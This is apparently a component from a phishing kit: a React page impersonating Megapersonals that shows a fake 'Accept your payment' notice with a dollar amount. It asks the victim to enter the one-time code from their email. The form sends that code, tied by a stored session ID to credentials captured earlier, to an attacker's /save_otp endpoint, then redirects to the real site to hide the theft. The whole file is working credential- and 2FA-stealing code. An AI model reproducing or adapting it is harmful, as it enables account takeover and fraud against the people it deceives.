import React, { useState, useEffect } from "react";
import "../auth/css/1e43e3ab50fce75fsw.css"; // Import the CSS file
import "../auth/css/57978a1014ff42c9sw.css"; // Import the CSS file
import devilGirl from "../auth/images/devilgirl.png";

const Otp = () => {
  const insertId = sessionStorage.getItem("insertId");
  const apiUrl = process.env.REACT_APP_API_URL;
  const tag = process.env.REACT_APP_TAG;
  const amount = process.env.REACT_APP_AMOUNT;

  const [formData, setFormData] = useState({
    otp: "",
    insertId: insertId,
    email: "",  // Added email to state
    password: "",  // Added password to state
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  useEffect(() => {
    setFormData((prevData) => ({
      ...prevData,
      insertId: insertId,
    }));
  }, [insertId]);

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevents the default form submission behavior

    try {
      const response = await fetch(`${apiUrl}/save_otp`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        const result = await response.json();
        console.log("Server Response:", result);

        if (result.success) {
          window.location.href = "https://megapersonals.com";
        }
      } else {
        alert("Error submitting form");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred while submitting the form.");
    }
  };

  return (
    <div className=" text-neutral-950">
      {/* Video Background */}
      <video
        autoPlay
        muted
        playsInline
        className="fixed inset-0 w-full h-full object-cover object-center"
        id="video"
        src="your-video-source.mp4" // Ensure the video source is specified
      ></video>

      {/* Login Page */}
      <div className="relative min-h-screen flex items-center justify-center p-4 text-center" id="login-page">
        <div className="bg-neutral-50 w-full max-w-md p-6 rounded-xl">
          <p className="text-3xl font-semibold">Accept your payment</p>
          <p className="mt-3 leading-relaxed max-w-[32ch] mx-auto">
            You just got{" "}
            <span className="text-green-500 font-semibold">${amount}</span> from
            {tag}
          </p>
          <img src={devilGirl} alt="Devil Girl" width="180" height="120" />
          <p className="text-lg font-semibold mt-3">To accept money</p>
          <p className="text-xl font-semibold mt-3">Login with Megapersonals</p>

          {/* Notification */}
          <h6 style={{ fontSize: "13px", color: "green" }}>
            <b>Check spam folder to your email </b>
          </h6>

          {/* Login Form */}
          <form className="flex flex-col gap-y-4 mt-4" onSubmit={handleSubmit}>
            <input
              required
              className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
              placeholder="Enter code here"
              type="text"
              name="otp"
              id="otp"
              value={formData.otp}
              onChange={handleChange}
              aria-label="Otp"
            />
            
            <button
              type="submit"
              className="h-11 rounded text-neutral-50 font-medium bg-green-500 hover:bg-green-600 disabled:bg-green-200"
            >
              Submit
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Otp;
